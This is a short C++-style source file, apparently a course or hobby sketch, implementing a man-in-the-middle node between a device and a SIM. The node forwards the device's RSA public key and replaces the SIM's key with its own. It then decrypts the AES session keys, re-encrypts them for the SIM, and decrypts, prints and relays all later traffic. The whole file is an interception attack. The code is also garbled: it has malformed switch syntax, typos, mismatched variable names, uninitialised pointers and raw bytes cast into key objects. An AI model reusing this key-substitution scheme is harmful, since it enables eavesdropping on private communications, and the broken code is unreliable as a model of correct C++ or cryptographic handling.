#import "Node.h"

global int mimStatus;
global Node mimNode;

void MIMswitch(){
//initialize
mimNode.generateKeysRSA();

while(0==0){
	switch(status)
		case: AWAITING_DEVICE_CERT
			deviceCert();
			break;
		case: AWAITING_SIM_CERT
			simCert();
			break;
		case: AWAITNG_AES_KEYS
			awaitingAes();
			break;
		case: INTERCEPTING_DATA
			intercept();
			break;
	}
}

//waiting to recieve public key from device
void deviceCert(){
	//listen on device port
	char* packet=listen(DEVICE_PORT);
	
	//if packet was not device cert, exit
	if(packey.type!=DEVICE_CERT){
		return;
	}

	//extract the key from its offset within the packet data
	char* deviceKeyData;
	for(int i=0; i<PUBLIC_KEY_CHAR_LENGTH; ++i){	
		deviceKeyData[i]=packet[i+PUBLIC_KEY_START_INDEX];
	}

	//convert it to a proper PublicKey object
	CryptoPP::RSA::PublicKey *deviceKey = reinterpret_cast<CryptoPP::RSA::PublicKey*>(deviceKeyData);

	//device's public key added to keylist at index 1 (MIM public key at 0)
	mimNode.addPubKey(deviceKey);

	//update status and forward packet to SIM
	status=AWAITING_SIM_CERT;
	send(SIM, packet);
}

//wait to recieve public key from sim
void simCert(){
	//listen on sim port
	char* packet=listen(SIM_PORT);
	
	//if packet was not sim cert, exit
	if(packet.type()!=SIM_CERT){
		return;
	}

	//extract the key from its offset within the packet data
	char* simKeyData;
	for(int i=0; i<PUBLIC_KEY_CHAR_LENGTH; ++i){	
		simKeyData[i]=packet[i+PUBLIC_KEY_START_INDEX];
	}
	
	//convert it to a proper PublicKey object
	CryptoPP::RSA::PublicKey *deviceKey = reinterpret_cast<CryptoPP::RSA::PublicKey*>(deviceKeyData);

	//sim's public key added to keylist at index 2
	mimNode.addPubKey(simKey);

	//get the MIM's public key and convert to char*
	CryptoPP::RSA::PublicKey mimPubKey=mimNode.getKey(0);
	char *mimPubData = reinterpret_cast<char*>(&mimPubKey);

	//replace the sim key in the packet with the MIM key
	for(int i=0; i<PUBLIC_KEY_CHAR_LENGTH; ++i){	
		packet[i+PUBLIC_KEY_START_INDEX]=mimPubData[i];
	}

	//update status and send edited packet to device
	status=AWAITING_AES_KEYS;
	send(DEVICE, packet);
}

void awaitingAES(){
	//listen for AES keys from device
	char* packet=listen(DEVICE_PORT);

	//check to make sure legal packet type
	if(packet.type()!=AES_TRANSMIT){
		return;
	}

	//decrypt the packet & convert to char*
	std::string aesPacket=mimNode.RSAdecrypt();
	const char* cAesPacket = aesPacket.c_str();


	//extract the first part of the AES key
	char* secByteBlockData;
	for(int i=0; i<SEC_BYTE_BLOCK_CHAR_LENGTH; ++i){
		secByteBlockData[i]=cAesPacket[i+SEC_BYTE_BLOCK_CHAR_OFFSET];
	}

	//extract the second part of the AES key
	char* byteData;
	for(int i=0; i<BYTE_DATA_CHAR_LENGTH; ++i){
		byteData[i]=cAesPacket[i+BYTE_DATA_CHAR_OFFSET];
	}

	//convert them to proper type
	CryptoPP::SecByteBlock *aesKey = reinterpret_cast<CryptoPP::SecByteBlock*>(secByteBlockData);
	byte *byteKey = reinterpret_cast<byte*>(data);

	//store the keys
	mimNode.setKeysAES(aesKey, byteKey);

	//encrypt the packet with the sim public key so it doesn't reject the AES keys
	aesPacket = mimNode.RSAencrypt(aesPacket, mimNode.getKey(2));

	//convert std::string to char*
	char *sendMe = new char[aesPacket.length() + 1];
	std::strcpy(sendMe, aesPacket.c_str());

	//update status and forward tampered packet to sim
	status=INTERCEPTING_DATA;
	send(SIM, sendMe);
}

void intercept(){
	//catch packet and store the intended destination
	int destination;
	char* packet=listen(DEVICE_PORT && SIM_PORT);
	destination=packet.destination();

	//decrypt the packet
	std::string pacString(packet);
	pacString=mimNode.AESdecrypt(pacString);

	//do whatever to the packet, for now just print out
	std::cout<<pacString<<std::endl;

	//convert std::string to char*
	char *sendMe = new char[pacString.length() + 1];
	std::strcpy(sendMe, pacString.c_str());

	//send compromised packet on to its destination
	send(destination, sendMe);
}
